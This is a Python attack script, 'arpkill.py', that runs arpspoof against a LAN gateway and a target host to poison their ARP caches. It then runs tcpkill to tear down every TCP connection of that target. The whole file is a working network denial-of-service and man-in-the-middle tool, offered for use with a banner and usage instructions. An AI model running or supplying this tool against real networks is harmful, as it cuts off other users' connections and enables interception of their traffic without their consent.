#!/usr/bin/python 
#
#   File: arpkill.py
#   Author: Nick Lauri
#	Description: Kill connection(s) in LAN
#
#   Coyright (c) 2016 by Nick Lauri.
#

"""
	Script requirements:
		netifaces 	(pip)
		libs		(nicklauri@github.com/kpylibs)

	Note:
		interactive mode will be updated later.
"""

import os
import sys
import time
import threading
import subprocess as sp
import libs.kpstd as kout
import libs.netifaces as netifaces

INTERFACE = str()
GATEWAY   = str()
TARGET    = str()

class mode:
	interactive = False

def banner():
	kout.info('KProject ARP Kill v1.0 - written by Nick Lauri\n')

def usage():
	kout.info('Usage:\n')
	kout.out('\tpython %s INTERFACE TARGET [-h]\n' %(sys.argv[0]))
	kout.info('Note:\n')
	#kout.out('\t-i : interactive mode.\n')
	kout.out('\t-h : show help.\n')
	kout.out('\tIf no GATEWAY or TARGET is specified, interactive mode will be switched to ON.\n')

def parse_args():
	global INTERFACE, GATEWAY, TARGET
	if len(sys.argv) < 3:
		banner()
		kout.error('at least 2 arguments from commandline.\n')
		usage()
		os._exit(1)
	elif '-h' in sys.argv:
		banner()
		usage()
	else:
		INTERFACE = sys.argv[1]
		GATEWAY   = get_gateway(INTERFACE)
		TARGET    = sys.argv[2]

def get_gateway(interface='wlan0'):
	# >>> n.gateways()
	# {'default': {2: ('192.168.1.1', 'wlan0'), 10: ('fe80::1', 'wlan0')}, 2: [('192.168.1.1', 'wlan0', True)], 10: [
	# ('fe80::1', 'wlan0', True)]}
	for item in netifaces.gateways()[netifaces.AF_INET]:
		if item[1] == interface:
			return item[0]
	else:
		kout.error('can\'t find the gateway\n')
		print(netifaces.gateways()[netifaces.AF_INET])
		return None

def shell():
	pass

t_arpspoof = t_tcpkill = None
def main():
	global t_arpspoof, t_tcpkill
	if os.name != 'posix':
		kout.error('Only support on GNU/Linux system.\n')
		os._exit(1)

	parse_args()
	kout.info('arpkill is running.\n')
	kout.info('attack information:\n')
	kout.out('\tinterface: %s\n' %INTERFACE)
	kout.out('\tgateway  : %s\n' %GATEWAY)
	kout.out('\ttarget   : %s\n' %TARGET)
	cmd_arpspoof = 'arpspoof -i %s -t %s %s -r' %(INTERFACE, GATEWAY, TARGET)
	cmd_tcpkill  = 'tcpkill -i %s net %s' %(INTERFACE, TARGET)
	run_arpspoof = lambda : sp.Popen(cmd_arpspoof.split(), stdout=sp.PIPE, stderr=sp.PIPE, shell=False)
	run_tcpkill  = lambda : sp.Popen(cmd_tcpkill.split(), stdout=sp.PIPE, stderr=sp.PIPE, shell=False)

	kout.info('arpspoof is running\n')
	t_arpspoof = threading.Thread(target=run_arpspoof).start()
	kout.info('tcpkill is running\n')
	t_tcpkill  = threading.Thread(target=run_tcpkill).start()

	try:
		while True:
			time.sleep(1000)
	except KeyboardInterrupt:
		kout.info('waiting for all threads to stop.\n')
		os.system('killall arpspoof tcpkill >/dev/null')
		t_main = threading.current_thread()
		for thread in threading.enumerate():
			if thread != t_main:
				threading.join(thread)
		kout.info('all threads are stopped.\n')
		return


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		if t_tcpkill or t_arpspoof:
			kout.info('Waiting for all threads to stop.')
			os.system('killall arpspoof tcpkill >/dev/null')
			t_main = threading.current_thread()
			for thread in threading.enumerate():
				if thread != t_main:
					threading.join(thread)
		kout.error('user quit.\n')
		os._exit(1)
	else:
		kout.info('exitting.\n')
